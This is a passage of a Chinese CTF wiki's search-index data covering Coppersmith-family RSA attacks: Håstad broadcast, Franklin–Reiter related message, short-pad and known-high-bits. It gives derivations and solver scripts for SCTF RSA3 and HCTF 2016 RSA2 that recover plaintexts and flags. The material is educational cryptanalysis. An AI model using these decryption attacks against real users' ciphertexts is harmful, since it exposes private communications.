\u5728\u8fd9\u6837\u7684\u57fa\u7840\u4e4b\u4e0a\uff0c\u6211\u4eec\u518d\u6784\u9020\u51fa\u591a\u9879\u5f0f\u65cf g \u5c31\u53ef\u4ee5\u4e86\u3002 \u5173\u4e8e\u66f4\u52a0\u7ec6\u8282\u7684\u5185\u5bb9\uff0c\u8bf7\u81ea\u884c\u641c\u7d22\u3002\u540c\u65f6\u8fd9\u90e8\u5206\u5185\u5bb9\u4e5f\u4f1a\u4e0d\u65ad\u66f4\u65b0\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u7531\u4e8e Coppersmith \u6839\u7684\u7ea6\u675f\uff0c\u5728 RSA \u4e2d\u7684\u5e94\u7528\u65f6\uff0c\u5f80\u5f80\u53ea\u9002\u7528\u4e8e e \u8f83\u5c0f\u7684\u60c5\u51b5\u3002","title":"\u57fa\u672c\u539f\u7406"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#basic-broadcast-attack","text":"","title":"Basic Broadcast Attack"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_2","text":"\u5982\u679c\u4e00\u4e2a\u7528\u6237\u4f7f\u7528\u540c\u4e00\u4e2a\u52a0\u5bc6\u6307\u6570 e \u52a0\u5bc6\u4e86\u540c\u4e00\u4e2a\u5bc6\u6587\uff0c\u5e76\u53d1\u9001\u7ed9\u4e86\u5176\u4ed6 e \u4e2a\u7528\u6237\u3002\u90a3\u4e48\u5c31\u4f1a\u4ea7\u751f\u5e7f\u64ad\u653b\u51fb\u3002\u8fd9\u4e00\u653b\u51fb\u7531 H\u00e5stad \u63d0\u51fa\u3002","title":"\u653b\u51fb\u6761\u4ef6"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_3","text":"\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe e \u4e3a 3\uff0c\u5e76\u4e14\u52a0\u5bc6\u8005\u4f7f\u7528\u4e86\u4e09\u4e2a\u4e0d\u540c\u7684\u6a21\u6570 n_1,n_2,n_3 n_1,n_2,n_3 \u7ed9\u4e09\u4e2a\u4e0d\u540c\u7684\u7528\u6237\u53d1\u9001\u4e86\u52a0\u5bc6\u540e\u7684\u6d88\u606f m\uff0c\u5982\u4e0b \\begin{align*} c_1&=m^3\\bmod n_1 \\\\ c_2&=m^3\\bmod n_2 \\\\ c_3&=m^3\\bmod n_3 \\end{align*} \\begin{align*} c_1&=m^3\\bmod n_1 \\\\ c_2&=m^3\\bmod n_2 \\\\ c_3&=m^3\\bmod n_3 \\end{align*} \u8fd9\u91cc\u6211\u4eec\u5047\u8bbe n_1,n_2,n_3 n_1,n_2,n_3 \u4e92\u7d20\uff0c\u4e0d\u7136\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u5206\u89e3\uff0c\u7136\u540e\u5f97\u5230 d\uff0c\u8fdb\u800c\u7136\u540e\u76f4\u63a5\u89e3\u5bc6\u3002 \u540c\u65f6\uff0c\u6211\u4eec\u5047\u8bbe m<n_i, 1\\leq i \\leq 3 m<n_i, 1\\leq i \\leq 3 \u3002\u5982\u679c\u8fd9\u4e2a\u6761\u4ef6\u4e0d\u6ee1\u8db3\u7684\u8bdd\uff0c\u5c31\u4f1a\u4f7f\u5f97\u60c5\u51b5\u53d8\u5f97\u6bd4\u8f83\u590d\u6742\uff0c\u8fd9\u91cc\u6211\u4eec\u6682\u4e0d\u8ba8\u8bba\u3002 \u65e2\u7136\u4ed6\u4eec\u4e92\u7d20\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u6839\u636e\u4e2d\u56fd\u5269\u4f59\u5b9a\u7406\uff0c\u53ef\u5f97 m^3 \\equiv C \\bmod n_1n_2n_3 m^3 \\equiv C \\bmod n_1n_2n_3 \u3002 \u6b64\u5916\uff0c\u65e2\u7136 m<n_i, 1\\leq i \\leq 3 m<n_i, 1\\leq i \\leq 3 \uff0c\u90a3\u4e48\u6211\u4eec\u77e5\u9053 m^3 < n_1n_2n_3 m^3 < n_1n_2n_3 \u5e76\u4e14 C<m^3 < n_1n_2n_3 C<m^3 < n_1n_2n_3 \uff0c\u90a3\u4e48 m^3 = C m^3 = C \uff0c\u6211\u4eec\u5bf9 C \u5f00\u4e09\u6b21\u6839\u5373\u53ef\u5f97\u5230 m \u7684\u503c\u3002 \u5bf9\u4e8e\u8f83\u5927\u7684 e \u6765\u8bf4\uff0c\u6211\u4eec\u53ea\u662f\u9700\u8981\u66f4\u591a\u7684\u660e\u5bc6\u6587\u5bf9\u3002","title":"\u653b\u51fb\u539f\u7406"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#sctf-rsa3-level4","text":"\u53c2\u8003 http://ohroot.com/2016/07/11/rsa-in-ctf \u3002 \u8fd9\u91cc\u6211\u4eec\u4ee5 SCTF RSA3 \u4e2d\u7684 level4 \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u9996\u5148\u7f16\u5199\u4ee3\u7801\u63d0\u53d6 cap \u5305\u4e2d\u7684\u6570\u636e\uff0c\u5982\u4e0b #!/usr/bin/env python from scapy.all import * import zlib import struct PA = 24 packets = rdpcap ( './syc_security_system_traffic3.pcap' ) client = '192.168.1.180' list_n = [] list_m = [] list_id = [] data = [] for packet in packets: # TCP Flag PA 24 means carry data if packet [ TCP ] .flags == PA or packet [ TCP ] .flags == PA + 1 : src = packet [ IP ] .src raw_data = packet [ TCP ] .load head = raw_data.strip ()[ :7 ] if head == \"We have\" : n, e = raw_data.strip () .replace ( \"We have got N is \" , \"\" ) .split ( '\\ne is ' ) data.append ( n.strip ()) if head == \"encrypt\" : m = raw_data.replace ( 'encrypted messages is 0x' , '' ) .strip () data.append ( str ( int ( m, 16 ))) with open ( './data.txt' , 'w' ) as f: for i in range ( 0 , len ( data ) , 2 ) : tmp = ',' .join ( s for s in data [ i:i + 2 ]) f.write ( tmp + '\\n' ) \u5176\u6b21\uff0c\u5229\u7528\u5f97\u5230\u7684\u6570\u636e\u76f4\u63a5\u4f7f\u7528\u4e2d\u56fd\u5269\u4f59\u5b9a\u7406\u6c42\u89e3\u3002 from functools import reduce import gmpy import json , binascii def modinv ( a , m ): return int ( gmpy . invert ( gmpy . mpz ( a ), gmpy . mpz ( m ))) def chinese_remainder ( n , a ): sum = 0 prod = reduce ( lambda a , b : a * b , n ) # \u5e76\u884c\u8fd0\u7b97 for n_i , a_i in zip ( n , a ): p = prod // n_i sum += a_i * modinv ( p , n_i ) * p return int ( sum % prod ) nset = [] cset = [] with open ( \"data.txt\" ) as f : now = f . read () . strip ( ' \\n ' ) . split ( ' \\n ' ) for item in now : item = item . split ( ',' ) nset . append ( int ( item [ 0 ])) cset . append ( int ( item [ 1 ])) m = chinese_remainder ( nset , cset ) m = int ( gmpy . mpz ( m ) . root ( 19 )[ 0 ]) print binascii . unhexlify ( hex ( m )[ 2 : - 1 ]) \u5f97\u5230\u5bc6\u6587\uff0c\u7136\u540e\u518d\u6b21\u89e3\u5bc6\u5373\u53ef\u5f97\u5230 flag\u3002 H1sTaDs_B40aDcadt_attaCk_e_are_same_and_smA9l","title":"SCTF RSA3 LEVEL4"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_4","text":"2017 WHCTF OldDriver 2018 N1CTF easy_fs","title":"\u9898\u76ee"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#broadcast-attack-with-linear-padding","text":"\u5bf9\u4e8e\u5177\u6709\u7ebf\u6027\u586b\u5145\u7684\u60c5\u51b5\u4e0b\uff0c\u4ecd\u7136\u53ef\u4ee5\u653b\u51fb\uff0c\u8fd9\u65f6\u5019\u5c31\u4f1a\u4f7f\u7528 Coppersmith method \u7684\u65b9\u6cd5\u4e86\uff0c\u8fd9\u91cc\u6682\u4e0d\u4ecb\u7ecd\u3002\u53ef\u4ee5\u53c2\u8003 https://en.wikipedia.org/wiki/Coppersmith%27s_attack#Generalizations","title":"Broadcast Attack with Linear Padding"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#related-message-attack","text":"","title":"Related Message Attack"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_5","text":"\u5f53 Alice \u4f7f\u7528\u540c\u4e00\u516c\u94a5\u5bf9\u4e24\u4e2a\u5177\u6709\u67d0\u79cd\u7ebf\u6027\u5173\u7cfb\u7684\u6d88\u606f M1 \u4e0e M2 \u8fdb\u884c\u52a0\u5bc6\uff0c\u5e76\u5c06\u52a0\u5bc6\u540e\u7684\u6d88\u606f C1\uff0cC2 \u53d1\u9001\u7ed9\u4e86 Bob \u65f6\uff0c\u6211\u4eec\u5c31\u53ef\u80fd\u53ef\u4ee5\u83b7\u5f97\u5bf9\u5e94\u7684\u6d88\u606f M1 \u4e0e M2\u3002\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\u6a21\u6570\u4e3a N\uff0c\u4e24\u8005\u4e4b\u95f4\u7684\u7ebf\u6027\u5173\u7cfb\u5982\u4e0b M_1 \\equiv f(M_2) \\bmod N M_1 \\equiv f(M_2) \\bmod N \u5176\u4e2d f \u4e3a\u4e00\u4e2a\u7ebf\u6027\u51fd\u6570\uff0c\u6bd4\u5982\u8bf4 f=ax+b f=ax+b \u3002 \u5728\u5177\u6709\u8f83\u5c0f\u9519\u8bef\u6982\u7387\u4e0b\u7684\u60c5\u51b5\u4e0b\uff0c\u5176\u590d\u6742\u5ea6\u4e3a O(elog^2N) O(elog^2N) \u3002 \u8fd9\u4e00\u653b\u51fb\u7531 Franklin\uff0cReiter \u63d0\u51fa\u3002","title":"\u653b\u51fb\u6761\u4ef6"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_6","text":"\u9996\u5148\uff0c\u6211\u4eec\u77e5\u9053 C_1 \\equiv M_1 ^e \\bmod N C_1 \\equiv M_1 ^e \\bmod N \uff0c\u5e76\u4e14 M_1 \\equiv f(M_2) \\bmod N M_1 \\equiv f(M_2) \\bmod N \uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u77e5\u9053 M_2 M_2 \u662f f(x)^e \\equiv C_1 \\bmod N f(x)^e \\equiv C_1 \\bmod N \u7684\u4e00\u4e2a\u89e3\uff0c\u5373\u5b83\u662f\u65b9\u7a0b f(x)^e-C_1 f(x)^e-C_1 \u5728\u6a21 N \u610f\u4e49\u4e0b\u7684\u4e00\u4e2a\u6839\u3002\u540c\u6837\u7684\uff0c M_2 M_2 \u662f x^e - C_2 x^e - C_2 \u5728\u6a21 N \u610f\u4e49\u4e0b\u7684\u4e00\u4e2a\u6839\u3002\u6240\u4ee5\u8bf4 x-M_2 x-M_2 \u540c\u65f6\u6574\u9664\u4ee5\u4e0a\u4e24\u4e2a\u591a\u9879\u5f0f\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u6c42\u5f97\u4e24\u4e2a\u591a\u9879\u5f0f\u7684\u6700\u5927\u516c\u56e0\u5b50\uff0c\u5982\u679c\u6700\u5927\u516c\u56e0\u5b50\u6070\u597d\u662f\u7ebf\u6027\u7684\u8bdd\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u6c42\u5f97\u4e86 M_2 M_2 \u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728 e=3 e=3 \u7684\u60c5\u51b5\u4e0b\uff0c\u6700\u5927\u516c\u56e0\u5b50\u4e00\u5b9a\u662f\u7ebf\u6027\u7684\u3002 \u8fd9\u91cc\u6211\u4eec\u5173\u6ce8\u4e00\u4e0b e=3 e=3 \uff0c\u4e14 f(x)=ax+b f(x)=ax+b \u7684\u60c5\u51b5\u3002\u9996\u5148\u6211\u4eec\u6709 C_1 \\equiv M_1 ^3 \\bmod N,M_1 \\equiv aM_2+b \\bmod N C_1 \\equiv M_1 ^3 \\bmod N,M_1 \\equiv aM_2+b \\bmod N \u90a3\u4e48\u6211\u4eec\u6709 C_1 \\equiv (aM_2+b)^3 \\bmod N,C_2 \\equiv M_2^3 \\bmod N C_1 \\equiv (aM_2+b)^3 \\bmod N,C_2 \\equiv M_2^3 \\bmod N \u6211\u4eec\u9700\u8981\u660e\u786e\u4e00\u4e0b\u6211\u4eec\u60f3\u8981\u5f97\u5230\u7684\u662f\u6d88\u606f m\uff0c\u6240\u4ee5\u9700\u8981\u5c06\u5176\u5355\u72ec\u6784\u9020\u51fa\u6765\u3002 \u9996\u5148\uff0c\u6211\u4eec\u6709\u5f0f 1 (aM_2+b)^3=a^3M_2^3+3a^2M^2b+3aM_2b^2+b^3 (aM_2+b)^3=a^3M_2^3+3a^2M^2b+3aM_2b^2+b^3 \u518d\u8005\u6211\u4eec\u6784\u9020\u5982\u4e0b\u5f0f 2 (aM_2)^3-b^3 \\equiv (aM_2-b)(a^2M_2^2+aM_2b+b^2) \\bmod N (aM_2)^3-b^3 \\equiv (aM_2-b)(a^2M_2^2+aM_2b+b^2) \\bmod N \u6839\u636e\u5f0f 1 \u6211\u4eec\u6709 a^3M_2^3-2b^3+3b(a^2M_2^2+aM_2b+b^2) \\equiv C_1 \\bmod N a^3M_2^3-2b^3+3b(a^2M_2^2+aM_2b+b^2) \\equiv C_1 \\bmod N \u7ee7\u800c\u6211\u4eec\u6709\u5f0f 3 3b(a^2M_2^2+aM_2b+b^2) \\equiv C_1-a^3C_2+2b^3 \\bmod N 3b(a^2M_2^2+aM_2b+b^2) \\equiv C_1-a^3C_2+2b^3 \\bmod N \u90a3\u4e48\u6211\u4eec\u6839\u636e\u5f0f 2 \u4e0e\u5f0f 3 \u53ef\u5f97 (a^3C_2-b^3)*3b \\equiv (aM_2-b)( C_1-a^3C_2+2b^3 ) \\bmod N (a^3C_2-b^3)*3b \\equiv (aM_2-b)( C_1-a^3C_2+2b^3 ) \\bmod N \u8fdb\u800c\u6211\u4eec\u6709 aM_2-b=\\frac{3a^3bC_2-3b^4}{C_1-a^3C_2+2b^3} aM_2-b=\\frac{3a^3bC_2-3b^4}{C_1-a^3C_2+2b^3} \u8fdb\u800c aM_2\\equiv \\frac{2a^3bC_2-b^4+C_1b}{C_1-a^3C_2+2b^3} aM_2\\equiv \\frac{2a^3bC_2-b^4+C_1b}{C_1-a^3C_2+2b^3} \u8fdb\u800c M_2 \\equiv\\frac{2a^3bC_2-b^4+C_1b}{aC_1-a^4C_2+2ab^3}=\\frac{b}{a}\\frac{C_1+2a^3C_2-b^3}{C_1-a^3C_2+2b^3} M_2 \\equiv\\frac{2a^3bC_2-b^4+C_1b}{aC_1-a^4C_2+2ab^3}=\\frac{b}{a}\\frac{C_1+2a^3C_2-b^3}{C_1-a^3C_2+2b^3} \u4e0a\u9762\u7684\u5f0f\u5b50\u4e2d\u53f3\u8fb9\u6240\u6709\u7684\u5185\u5bb9\u90fd\u662f\u5df2\u77e5\u7684\u5185\u5bb9\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u83b7\u53d6\u5bf9\u5e94\u7684\u6d88\u606f\u3002 \u6709\u5174\u8da3\u7684\u53ef\u4ee5\u8fdb\u4e00\u6b65\u9605\u8bfb A New Related Message Attack on RSA \u4ee5\u53ca paper \u8fd9\u91cc\u6682\u4e0d\u505a\u8fc7\u591a\u7684\u8bb2\u89e3\u3002","title":"\u653b\u51fb\u539f\u7406"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#sctf-rsa3","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5 SCTF RSA3 \u4e2d\u7684 level3 \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u9996\u5148\uff0c\u8ddf\u8e2a TCP \u6d41\u53ef\u4ee5\u77e5\u9053\uff0c\u52a0\u5bc6\u65b9\u5f0f\u662f\u5c06\u660e\u6587\u52a0\u4e0a\u7528\u6237\u7684 user id \u8fdb\u884c\u52a0\u5bc6\uff0c\u800c\u4e14\u8fd8\u5b58\u5728\u591a\u7ec4\u3002\u8fd9\u91cc\u6211\u4eec\u9009\u62e9\u7b2c 0 \u7ec4\u548c\u7b2c 9 \u7ec4\uff0c\u4ed6\u4eec\u7684\u6a21\u6570\u4e00\u6837\uff0c\u89e3\u5bc6\u811a\u672c\u5982\u4e0b import gmpy2 id1 = 1002 id2 = 2614 c1 = 0x547995f4e2f4c007e6bb2a6913a3d685974a72b05bec02e8c03ba64278c9347d8aaaff672ad8460a8cf5bffa5d787c5bb724d1cee07e221e028d9b8bc24360208840fbdfd4794733adcac45c38ad0225fde19a6a4c38e4207368f5902c871efdf1bdf4760b1a98ec1417893c8fce8389b6434c0fee73b13c284e8c9fb5c77e420a2b5b1a1c10b2a7a3545e95c1d47835c2718 L c2 = 0x547995f4e2f4c007e6bb2a6913a3d685974a72b05bec02e8c03ba64278c9347d8aaaff672ad8460a8cf5bffa5d787c72722fe4fe5a901e2531b3dbcb87e5aa19bbceecbf9f32eacefe81777d9bdca781b1ec8f8b68799b4aa4c6ad120506222c7f0c3e11b37dd0ce08381fabf9c14bc74929bf524645989ae2df77c8608d0512c1cc4150765ab8350843b57a2464f848d8e08 L n = 25357901189172733149625332391537064578265003249917817682864120663898336510922113258397441378239342349767317285221295832462413300376704507936359046120943334215078540903962128719706077067557948218308700143138420408053500628616299338204718213283481833513373696170774425619886049408103217179262264003765695390547355624867951379789924247597370496546249898924648274419164899831191925127182066301237673243423539604219274397539786859420866329885285232179983055763704201023213087119895321260046617760702320473069743688778438854899409292527695993045482549594428191729963645157765855337481923730481041849389812984896044723939553 a = 1 b = id1 - id2 def getmessage ( a , b , c1 , c2 , n ): b3 = gmpy2 . powmod ( b , 3 , n ) part1 = b * ( c1 + 2 * c2 - b3 ) % n part2 = a * ( c1 - c2 + 2 * b3 ) % n part2 = gmpy2 . invert ( part2 , n ) return part1 * part2 % n message = getmessage ( a , b , c1 , c2 , n ) - id2 message = hex ( message )[ 2 :] if len ( message ) % 2 != 0 : message = '0' + message print message . decode ( 'hex' ) \u5f97\u5230\u660e\u6587 \u279c sctf-rsa3-level3 git: ( master ) \u2717 python exp.py F4An8LIn_rElT3r_rELa53d_Me33Age_aTtaCk_e_I2_s7aLL \u5f53\u7136\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 sage \u6765\u505a\uff0c\u4f1a\u66f4\u52a0\u7b80\u5355\u4e00\u70b9\u3002 import binascii def attack ( c1 , c2 , b , e , n ): PR .< x >= PolynomialRing ( Zmod ( n )) g1 = x ^ e - c1 g2 = ( x + b ) ^ e - c2 def gcd ( g1 , g2 ): while g2 : g1 , g2 = g2 , g1 % g2 return g1 . monic () return - gcd ( g1 , g2 )[ 0 ] c1 = 0x547995f4e2f4c007e6bb2a6913a3d685974a72b05bec02e8c03ba64278c9347d8aaaff672ad8460a8cf5bffa5d787c5bb724d1cee07e221e028d9b8bc24360208840fbdfd4794733adcac45c38ad0225fde19a6a4c38e4207368f5902c871efdf1bdf4760b1a98ec1417893c8fce8389b6434c0fee73b13c284e8c9fb5c77e420a2b5b1a1c10b2a7a3545e95c1d47835c2718 L c2 = 0x547995f4e2f4c007e6bb2a6913a3d685974a72b05bec02e8c03ba64278c9347d8aaaff672ad8460a8cf5bffa5d787c72722fe4fe5a901e2531b3dbcb87e5aa19bbceecbf9f32eacefe81777d9bdca781b1ec8f8b68799b4aa4c6ad120506222c7f0c3e11b37dd0ce08381fabf9c14bc74929bf524645989ae2df77c8608d0512c1cc4150765ab8350843b57a2464f848d8e08 L n = 25357901189172733149625332391537064578265003249917817682864120663898336510922113258397441378239342349767317285221295832462413300376704507936359046120943334215078540903962128719706077067557948218308700143138420408053500628616299338204718213283481833513373696170774425619886049408103217179262264003765695390547355624867951379789924247597370496546249898924648274419164899831191925127182066301237673243423539604219274397539786859420866329885285232179983055763704201023213087119895321260046617760702320473069743688778438854899409292527695993045482549594428191729963645157765855337481923730481041849389812984896044723939553 e = 3 a = 1 id1 = 1002 id2 = 2614 b = id2 - id1 m1 = attack ( c1 , c2 , b , e , n ) print binascii . unhexlify ( \" %x \" % int ( m1 - id1 )) \u7ed3\u679c\u5982\u4e0b \u279c sctf-rsa3-level3 git: ( master ) \u2717 sage exp.sage sys:1: RuntimeWarning: not adding directory '' to sys.path since everybody can write to it. Untrusted users could put files in this directory which might then be imported by your Python code. As a general precaution from similar exploits, you should not execute Python code from this directory F4An8LIn_rElT3r_rELa53d_Me33Age_aTtaCk_e_I2_s7aLL","title":"SCTF RSA3"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_7","text":"hitcon 2014 rsaha N1CTF 2018 rsa_padding","title":"\u9898\u76ee"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#coppersmiths-short-pad-attack","text":"","title":"Coppersmith\u2019s short-pad attack"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_8","text":"\u76ee\u524d\u5728\u5927\u90e8\u5206\u6d88\u606f\u52a0\u5bc6\u4e4b\u524d\u90fd\u4f1a\u8fdb\u884c padding\uff0c\u4f46\u662f\u5982\u679c padding \u7684\u957f\u5ea6\u8fc7\u77ed\uff0c\u4e5f\u6709 \u53ef\u80fd \u88ab\u5f88\u5bb9\u6613\u5730\u653b\u51fb\u3002 \u8fd9\u91cc\u6240\u8c13 padding \u8fc7\u77ed\uff0c\u5176\u5b9e\u5c31\u662f\u5bf9\u5e94\u7684\u591a\u9879\u5f0f\u7684\u6839\u4f1a\u8fc7\u5c0f\u3002","title":"\u653b\u51fb\u6761\u4ef6"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_9","text":"\u6211\u4eec\u5047\u8bbe\u7231\u4e3d\u4e1d\u8981\u7ed9\u9c8d\u52c3\u53d1\u9001\u6d88\u606f\uff0c\u9996\u5148\u7231\u4e3d\u4e1d\u5bf9\u8981\u52a0\u5bc6\u7684\u6d88\u606f M \u8fdb\u884c\u968f\u673a padding\uff0c\u7136\u540e\u52a0\u5bc6\u5f97\u5230\u5bc6\u6587 C1\uff0c\u53d1\u9001\u7ed9\u9c8d\u52c3\u3002\u8fd9\u65f6\uff0c\u4e2d\u95f4\u4eba\u76ae\u7279\u622a\u83b7\u4e86\u5bc6\u6587\u3002\u4e00\u6bb5\u65f6\u95f4\u540e\uff0c\u7231\u4e3d\u4e1d\u6ca1\u6709\u6536\u5230\u9c8d\u52c3\u7684\u56de\u590d\uff0c\u518d\u6b21\u5bf9\u8981\u52a0\u5bc6\u7684\u6d88\u606f M \u8fdb\u884c\u968f\u673a padding\uff0c\u7136\u540e\u52a0\u5bc6\u5f97\u5230\u5bc6\u6587 C2\uff0c\u53d1\u9001\u7ed9 Bob\u3002\u76ae\u7279\u518d\u4e00\u6b21\u622a\u83b7\u3002\u8fd9\u65f6\uff0c\u76ae\u7279\u5c31 \u53ef\u80fd \u53ef\u4ee5\u5229\u7528\u5982\u4e0b\u539f\u7406\u89e3\u5bc6\u3002 \u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\u6a21\u6570 N \u7684\u957f\u5ea6\u4e3a k\uff0c\u5e76\u4e14 padding \u7684\u957f\u5ea6\u4e3a m=\\lfloor \\frac{k}{e^2} \\rfloor m=\\lfloor \\frac{k}{e^2} \\rfloor \u3002\u6b64\u5916\uff0c\u5047\u8bbe\u8981\u52a0\u5bc6\u7684\u6d88\u606f\u7684\u957f\u5ea6\u6700\u591a\u4e3a k-m \u6bd4\u7279\uff0cpadding \u7684\u65b9\u5f0f\u5982\u4e0b M_1=2^mM+r_1, 0\\leq r_1\\leq 2^m M_1=2^mM+r_1, 0\\leq r_1\\leq 2^m \u6d88\u606f M2 \u7684 padding \u65b9\u5f0f\u7c7b\u4f3c\u3002 \u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u5982\u4e0b\u7684\u65b9\u5f0f\u6765\u89e3\u5bc6\u3002 \u9996\u5148\u5b9a\u4e49 g_1(x,y)=x^e-C_1 g_2(x,y)=(x+y)^e-C_2 g_1(x,y)=x^e-C_1 g_2(x,y)=(x+y)^e-C_2 \u5176\u4e2d y=r_2-r_1 y=r_2-r_1 \u3002\u663e\u7136\u8fd9\u4e24\u4e2a\u65b9\u7a0b\u5177\u6709\u76f8\u540c\u7684\u6839 M1\u3002\u7136\u540e\u8fd8\u6709\u4e00\u7cfb\u5217\u7684\u63a8\u5bfc\u3002","title":"\u653b\u51fb\u539f\u7406"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#known-high-bits-message-attack","text":"","title":"Known High Bits Message Attack"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_10","text":"\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\u6211\u4eec\u9996\u5148\u52a0\u5bc6\u4e86\u6d88\u606f m\uff0c\u5982\u4e0b C\\equiv m^d \\bmod N C\\equiv m^d \\bmod N \u5e76\u4e14\u6211\u4eec\u5047\u8bbe\u6211\u4eec\u77e5\u9053\u6d88\u606f m \u7684\u5f88\u5927\u7684\u4e00\u90e8\u5206 m_0 m_0 \uff0c\u5373 m=m_0+x m=m_0+x \uff0c\u4f46\u662f\u6211\u4eec\u4e0d\u77e5\u9053 x x \u3002\u90a3\u4e48\u6211\u4eec\u5c31\u6709\u53ef\u80fd\u901a\u8fc7\u8be5\u65b9\u6cd5\u8fdb\u884c\u6062\u590d\u6d88\u606f\u3002\u8fd9\u91cc\u6211\u4eec\u4e0d\u77e5\u9053\u7684 x \u5176\u5b9e\u5c31\u662f\u591a\u9879\u5f0f\u7684\u6839\uff0c\u9700\u8981\u6ee1\u8db3 Coppersmith \u7684\u7ea6\u675f\u3002 \u53ef\u4ee5\u53c2\u8003 https://github.com/mimoo/RSA-and-LLL-attacks \u3002","title":"\u653b\u51fb\u6761\u4ef6"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#factoring-with-high-bits-known","text":"","title":"Factoring with High Bits Known"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_11","text":"\u5f53\u6211\u4eec\u77e5\u9053\u4e00\u4e2a\u516c\u94a5\u4e2d\u6a21\u6570 N \u7684\u4e00\u4e2a\u56e0\u5b50\u7684\u8f83\u9ad8\u4f4d\u65f6\uff0c\u6211\u4eec\u5c31\u6709\u4e00\u5b9a\u51e0\u7387\u6765\u5206\u89e3 N\u3002","title":"\u653b\u51fb\u6761\u4ef6"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_12","text":"\u8bf7\u53c2\u8003 https://github.com/mimoo/RSA-and-LLL-attacks \u3002\u4e0a\u9762\u6709\u4f7f\u7528\u6559\u7a0b\u3002\u5173\u6ce8\u4e0b\u9762\u7684\u4ee3\u7801 beta = 0.5 dd = f . degree () epsilon = beta / 7 mm = ceil ( beta ** 2 / ( dd * epsilon )) tt = floor ( dd * mm * (( 1 / beta ) - 1 )) XX = ceil ( N ** (( beta ** 2 / dd ) - epsilon )) + 1000000000000000000000000000000000 roots = coppersmith_howgrave_univariate ( f , N , beta , mm , tt , XX ) \u5176\u4e2d\uff0c \u5fc5\u987b\u6ee1\u8db3 q\\geq N^{beta} q\\geq N^{beta} \uff0c\u6240\u4ee5\u8fd9\u91cc\u7ed9\u51fa\u4e86 beta=0.5 beta=0.5 \uff0c\u663e\u7136\u4e24\u4e2a\u56e0\u6570\u4e2d\u5fc5\u7136\u6709\u4e00\u4e2a\u662f\u5927\u4e8e\u7684\u3002 XX \u662f f(x)=q'+x f(x)=q'+x \u5728\u6a21 q \u610f\u4e49\u4e0b\u7684\u6839\u7684\u4e0a\u754c\uff0c\u81ea\u7136\u6211\u4eec\u53ef\u4ee5\u9009\u62e9\u8c03\u6574\u5b83\uff0c\u8fd9\u91cc\u5176\u5b9e\u4e5f\u8868\u660e\u4e86\u6211\u4eec\u5df2\u77e5\u7684 q' q' \u4e0e\u56e0\u6570 q \u4e4b\u95f4\u53ef\u80fd\u7684\u5dee\u8ddd\u3002","title":"\u653b\u51fb\u5de5\u5177"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#2016-hctf-rsa2","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5 2016 \u5e74 HCTF \u4e2d\u7684 RSA2 \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002 \u9996\u5148\u7a0b\u5e8f\u7684\u5f00\u5934\u662f\u4e00\u4e2a\u7ed5\u8fc7\u9a8c\u8bc1\u7684\uff0c\u7ed5\u8fc7\u5373\u53ef\uff0c\u4ee3\u7801\u5982\u4e0b from pwn import * from hashlib import sha512 sh = remote ( '127.0.0.1' , 9999 ) context . log_level = 'debug' def sha512_proof ( prefix , verify ): i = 0 pading = \"\" while True : try : i = randint ( 0 , 1000 ) pading += str ( i ) if len ( pading ) > 200 : pading = pading [ 200 :] #print pading except StopIteration : break r = sha512 ( prefix + pading ) . hexdigest () if verify in r : return pading def verify (): sh . recvuntil ( \"Prefix: \" ) prefix = sh . recvline () print len ( prefix ) prefix = prefix [: - 1 ] prefix = prefix . decode ( 'base64' ) proof = sha512_proof ( prefix , \"fffffff\" ) sh . send ( proof . encode ( 'base64' )) if __name__ == '__main__' : verify () print 'verify success' sh . recvuntil ( \"token: \" ) token = \"5c9597f3c8245907ea71a89d9d39d08e\" sh . sendline ( token ) sh . recvuntil ( \"n: \" ) n = sh . readline () . strip () n = int ( n [ 2 :], 16 ) sh . recvuntil ( \"e: \" ) e = sh . readline () . strip () e = int ( e [ 2 :], 16 ) sh . recvuntil ( \"e2: \" ) e2 = sh . readline () . strip () e2 = int ( e2 [ 2 :], 16 ) sh . recvuntil ( \"is: \" ) enc_flag = sh . readline () . strip () enc_flag = int ( enc_flag [ 2 : - 1 ], 16 ) print \"n: \" , hex ( n ) print \"e: \" , hex ( e 